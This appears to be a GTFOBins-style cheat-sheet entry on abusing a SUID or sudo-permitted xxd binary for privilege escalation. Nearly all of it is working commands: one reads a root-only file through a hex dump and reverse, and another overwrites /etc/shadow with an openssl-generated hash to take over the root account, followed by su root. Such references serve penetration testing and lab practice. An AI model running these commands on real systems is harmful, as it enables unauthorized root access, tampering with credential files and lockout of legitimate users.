# GTFOBins xxd Arbitrary File Read-Write

A SUID/sudo-permitted `xxd` reads and writes files as root via hex dump/reverse — including overwriting `/etc/shadow` with a known password hash.

```bash
# read
xxd /root/root.txt | xxd -r

# write (e.g. set a known root password)
openssl passwd -1 newpassword   # generate the hash first
echo 'root:<hash-from-above>:19627:0:99999:7:::' | /path/to/xxd | /path/to/xxd -r - /etc/shadow
su root
```
